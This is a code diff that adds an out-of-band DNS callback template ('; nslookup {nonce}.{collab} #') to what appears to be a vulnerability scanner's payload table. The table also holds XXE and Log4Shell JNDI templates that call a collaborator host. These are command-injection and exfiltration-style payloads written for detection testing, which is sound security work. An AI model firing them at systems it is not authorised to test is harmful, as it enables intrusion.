@@ -186,6 +186,7 @@ _TEMPLATES: dict[str, str] = {
     # replacement: ``${jndi:ldap://…}`` and ``<!ENTITY …>`` are untouched.
     "sqli_blind/oob-xxe-exfil": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{nonce}.{collab}/xxe">]>',
     "command_injection/log4shell-oob": "${jndi:ldap://{nonce}.{collab}/a}",
+    "command_injection/oob-dns-callback": "; nslookup {nonce}.{collab} #",
     # -- SSRF (Task 24) — hand-tagged, three families --------------------------
     # Blind SSRF → OOB_CALLBACK: the server fetches a callback URL carrying the
     # per-probe nonce ({nonce}.{collab}); confirmation is probe_nonce-in-observed.
